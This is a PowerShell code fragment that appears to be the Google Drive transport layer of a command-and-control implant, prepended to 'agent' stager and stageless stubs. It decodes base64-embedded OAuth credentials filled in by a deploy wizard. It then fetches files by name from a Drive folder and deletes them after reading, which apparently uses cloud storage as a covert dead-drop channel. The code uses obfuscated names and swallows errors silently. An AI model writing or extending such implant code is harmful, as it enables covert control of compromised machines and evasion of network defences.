# === TRANSPORT: Google Drive API v3 (stub layer, PowerShell) ===
# Files addressed by name within FOLDER_ID.
# Credentials substituted by wizard at deploy time.
# Prepended to agent/stub.ps1 and agent/stub_stageless.ps1.

$_Ci = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_CLIENT_ID_B64'))
$_Cs = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_CLIENT_SECRET_B64'))
$_Rt = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_REFRESH_TOKEN_B64'))
$_Fi = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_FOLDER_ID_B64'))

function _Tk {
    try {
        $r = Invoke-RestMethod -Method Post -ErrorAction Stop `
            -Uri 'https://oauth2.googleapis.com/token' `
            -ContentType 'application/x-www-form-urlencoded' `
            -Body "grant_type=refresh_token&refresh_token=$_Rt&client_id=$_Ci&client_secret=$_Cs"
        return $r.access_token
    } catch { _dbg "token error: $_"; return $null }
}

function _GFid($name, $tk) {
    try {
        $q = "name='$name' and '$_Fi' in parents and trashed=false"
        $r = Invoke-RestMethod -Method Get -ErrorAction Stop `
            -Uri "https://www.googleapis.com/drive/v3/files" `
            -Headers @{ Authorization = "Bearer $tk" } `
            -Body @{ q = $q; fields = 'files(id)' }
        return $r.files[0].id
    } catch { return $null }
}

function _Dl($tk, $path) {
    try {
        $name = ($path -split '/')[-1]
        $id   = _GFid $name $tk
        if (-not $id) { return $null }
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('Authorization', "Bearer $tk")
        $bytes = $wc.DownloadData("https://www.googleapis.com/drive/v3/files/${id}?alt=media")
        return [Text.Encoding]::UTF8.GetString($bytes)
    } catch { _dbg "download '$path' error: $_"; return $null }
}

function _Rm($tk, $path) {
    try {
        $name = ($path -split '/')[-1]
        $id   = _GFid $name $tk
        if ($id) {
            Invoke-RestMethod -Method Delete -ErrorAction SilentlyContinue `
                -Uri "https://www.googleapis.com/drive/v3/files/$id" `
                -Headers @{ Authorization = "Bearer $tk" } | Out-Null
        }
    } catch {}
}
